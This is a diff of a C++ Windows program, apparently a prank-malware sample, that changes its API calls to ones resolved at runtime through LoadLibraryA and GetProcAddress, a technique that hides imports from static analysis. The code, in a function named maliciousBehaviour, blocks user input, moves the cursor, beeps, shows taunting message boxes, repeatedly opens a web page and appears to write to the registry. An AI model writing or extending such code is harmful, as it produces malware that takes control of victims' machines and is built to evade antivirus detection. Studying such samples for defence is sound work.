@@ -8,33 +8,76 @@ void maliciousBehaviour();
 
 constexpr size_t LOOP_NUMBER = 3;
 
+using SleepFnType = VOID (*WINAPI)(DWORD);
+using BlockInputFnType = BOOL(*WINAPI)(BOOL);
+using SetCursorPosFnType = BOOL(*WINAPI)(int, int);
+using ShellExecuteAFnType = HINSTANCE(*WINAPI)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);
+using RegSetValueExAFnType = LSTATUS(*WINAPI)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
+using BeepFnType = BOOL(*WINAPI)(DWORD, DWORD);
+using MessageBoxAFnType = BOOL(*WINAPI)(HWND, LPCSTR, LPCSTR, INT);
+
+SleepFnType g_Sleep = nullptr;
+BlockInputFnType g_BlockInput = nullptr;
+SetCursorPosFnType g_SetCursorPos = nullptr;
+ShellExecuteAFnType g_ShellExecuteA = nullptr;
+RegSetValueExAFnType g_RegSetValueExA = nullptr;
+BeepFnType g_Beep = nullptr;
+MessageBoxAFnType g_MessageBoxA = nullptr;
+
+bool loadFunctions() {
+    HMODULE user32 = ::LoadLibraryA("user32.dll");
+    if (!user32) return false;
+    HMODULE kernel32 = ::LoadLibraryA("kernel32.dll");
+    if (!kernel32) return false;
+    HMODULE shell32 = ::LoadLibraryA("shell32.dll");
+    if (!shell32) return false;
+    HMODULE advapi32 = ::LoadLibraryA("advapi32.dll");
+    if (!advapi32) return false;
+
+    g_Sleep = (SleepFnType)::GetProcAddress(kernel32, "Sleep");
+    g_Beep = (BeepFnType)::GetProcAddress(kernel32, "Beep");
+    g_BlockInput = (BlockInputFnType)::GetProcAddress(user32, "BlockInput");
+    g_SetCursorPos = (SetCursorPosFnType)::GetProcAddress(user32, "SetCursorPos");
+    g_MessageBoxA = (MessageBoxAFnType)::GetProcAddress(user32, "MessageBoxA");
+    g_ShellExecuteA = (ShellExecuteAFnType)::GetProcAddress(shell32, "ShellExecuteA");
+    g_RegSetValueExA = (RegSetValueExAFnType)::GetProcAddress(advapi32, "RegSetValueExA");
+
+    if (!g_Sleep || !g_Beep || !g_BlockInput || !g_SetCursorPos || !g_MessageBoxA || !g_ShellExecuteA || !g_RegSetValueExA) return false;
+
+    return true;
+}
+
 int main()
 {
+    if (!loadFunctions()) {
+        return -1;
+    }
+
     //check if we run as administrator
     if (!checkIfBlockingInputIsPossible()) {
         return -1;
     }
-    
+
     //show messageBox
-    if (::MessageBoxA(NULL, "I'm watching you", "Windows", MB_OKCANCEL) == IDCANCEL)
+    if (g_MessageBoxA(NULL, "I'm watching you", "Windows", MB_OKCANCEL) == IDCANCEL)
     {
-        ::MessageBoxA(NULL, "HAHAHAHA!", "radkum", MB_OK);
+        g_MessageBoxA(NULL, "HAHAHAHA!", "radkum", MB_OK);
     }
 
     //sleep 2 seconds
-    ::Sleep(2000);
+    g_Sleep(2000);
 
     for(size_t i = 0; i < LOOP_NUMBER; i++)
     {
         radkumWebsite();
        
         //sleep 2 seconds
-        ::Sleep(2000);
+        g_Sleep(2000);
 
         maliciousBehaviour();
 
         //sleep 2 seconds
-        ::Sleep(2000);
+        g_Sleep(2000);
     }
     setRegister();
     return 0;
@@ -47,11 +90,11 @@ void maliciousBehaviour() {
         x += 160;
         y += 90;
 
-        ::BlockInput(TRUE);
-        ::SetCursorPos(x, y);
+        g_BlockInput(TRUE);
+        g_SetCursorPos(x, y);
 
         //sleep 0.5 seconds
-        ::Sleep(500);
+        g_Sleep(500);
     }
 
     //Sleep(1000);
@@ -59,19 +102,19 @@ void maliciousBehaviour() {
     for (size_t i = 0; i < LOOP_NUMBER; i++)
     {
         //printf("inner loop counter: %d\n", loop);
-        ::Beep(freq, 100);
+        g_Beep(freq, 100);
 
         //sleep 0.5 seconds
-        ::Sleep(500);
+        g_Sleep(500);
         freq++;
     }
 }
 
 void radkumWebsite() {
     char websiteAddress[MAX_PATH] = "https://github.com/radkum";
-    ShellExecuteA(NULL, "open", websiteAddress, NULL, NULL, SW_MAXIMIZE);
+    g_ShellExecuteA(NULL, "open", websiteAddress, NULL, NULL, SW_MAXIMIZE);
 
-    MessageBoxA(
+    g_MessageBoxA(
         NULL,
         "Oh,you want see my project? Welcome!",
         "radkum",
@@ -79,12 +122,12 @@ void radkumWebsite() {
 }
 
 bool checkIfBlockingInputIsPossible() {
-    BlockInput(TRUE);
+    g_BlockInput(TRUE);
     if (GetLastError() == 0x05 /*ACCESS_DENIED*/) {
         printf("Please run app as administrator!\n");
         return false;
     }
-    BlockInput(FALSE);
+    g_BlockInput(FALSE);
 
     return true;
 }
